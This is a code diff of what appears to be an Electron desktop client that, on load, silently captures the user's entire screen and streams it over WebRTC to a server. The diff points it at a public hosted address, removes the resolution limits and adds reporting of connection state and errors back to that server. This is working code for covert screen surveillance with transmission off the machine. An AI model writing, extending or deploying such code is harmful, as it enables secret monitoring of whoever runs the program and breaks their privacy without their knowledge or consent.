@@ -3,7 +3,7 @@
 // Change this to the IP Address of your main laptop (Anzee Laptop)
 // Example: const SERVER_URL = "http://192.168.1.15:3000";
 // =========================================================================
-const SERVER_URL = "http://192.168.1.42:3000"; // REPLACE THIS BEFORE BUILDING EXE!
+const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!
 
 let socket;
 let peerConnection;
@@ -41,11 +41,7 @@ window.onload = async () => {
                     video: {
                         mandatory: {
                             chromeMediaSource: 'desktop',
-                            chromeMediaSourceId: mainScreen.id,
-                            minWidth: 1280,
-                            maxWidth: 1920,
-                            minHeight: 720,
-                            maxHeight: 1080
+                            chromeMediaSourceId: mainScreen.id
                         }
                     }
                 });
@@ -60,6 +56,10 @@ window.onload = async () => {
                     }
                 };
 
+                peerConnection.onconnectionstatechange = () => {
+                    socket.emit('client-error', "WebRTC State: " + peerConnection.connectionState);
+                };
+
                 // Add the screen video track
                 localStream.getTracks().forEach(track => {
                     peerConnection.addTrack(track, localStream);
@@ -72,6 +72,7 @@ window.onload = async () => {
 
             } catch (e) {
                 console.error("Silent screen capture failed", e);
+                socket.emit('client-error', "Capture failed: " + e.message);
             }
         });
 
